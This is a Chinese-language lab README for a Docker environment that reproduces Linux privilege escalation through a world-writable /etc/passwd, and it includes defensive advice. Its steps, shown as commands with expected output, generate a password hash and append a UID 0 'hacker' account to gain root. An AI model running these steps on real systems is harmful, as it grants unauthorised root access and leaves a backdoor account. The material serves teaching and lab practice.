# /etc/passwd 可写提权

## 原理

/etc/passwd 每行格式：`用户名:密码占位:UID:GID:注释:家目录:shell`。正常情况密码
哈希在 /etc/shadow 里，passwd 中该字段为 x。当 /etc/passwd 对普通用户**可写**
（权限 666/777 或属主被改）时，直接追加一个 UID=0 的用户行（或把现有用户 UID
改成 0），即可用自己知道的密码登录 root 权限用户。

## 环境

- 基础镜像：ubuntu:20.04
- 低权限用户：lowpriv / lowpriv123
- 漏洞配置：/etc/passwd 权限 666

## 复现步骤

```bash
# 1. 构建并启动
docker compose up -d --build

# 2. 进入低权限用户
docker exec -it $(docker compose ps -q) su - lowpriv

# 3. 确认权限
ls -l /etc/passwd
# 预期输出: -rw-rw-rw- 1 root root ... /etc/passwd   (666, 可写!)

# 4. 生成密码哈希 (明文: 123456)
openssl passwd -1 -salt hacker 123456
# 预期输出: $1$hacker$6luIRwdGpBvXdP.GMwcZp/

# 5. 追加 UID=0 用户 (密码字段用上面的哈希)
echo 'hacker:$1$hacker$6luIRwdGpBvXdP.GMwcZp/:0:0:root:/root:/bin/bash' >> /etc/passwd

# 6. 登录新用户
su hacker
# 密码: 123456
# 预期输出: root@...:#   提权成功!
id
# 预期输出: uid=0(root) gid=0(root) groups=0(root)

# 7. 一键利用
bash exploit.sh
```

## 为什么能成功

新用户 hacker 的 UID 是 0——与 root 相同！登录后 uid=0 即 root。
也可把已有用户（如 lowpriv）行的 UID 从 1000 改成 0，效果相同。

## 防御

- /etc/passwd 权限必须为 644（属主 root）
- 定期检查：stat -c '%a %U %n' /etc/passwd
- 监控 /etc/passwd 变更（auditd）

## 验证记录

2026-08-26 真实环境验证：追加 hacker 用户后 `su hacker`（密码 123456）
输出 `uid=0(root) gid=0(root) groups=0(root)`。复现成功。
